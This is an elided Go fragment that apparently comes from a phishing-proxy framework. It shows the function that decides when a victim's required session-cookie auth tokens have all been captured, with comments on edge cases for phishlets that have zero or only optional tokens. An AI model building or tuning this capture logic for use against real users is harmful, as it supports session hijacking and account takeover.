...
func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
	// vacuous-completion guard: a phishlet with zero required tokens must
	// never report "captured", otherwise the first response of any session
	// instantly marks it done and breaks the whole flow
	total := 0
	...
	for k, v := range authTokens {
		...
		// domains whose tokens are ALL optional must not block completion
		if len(tcopy[k]) == 0 {
			delete(tcopy, k)
		}
	}
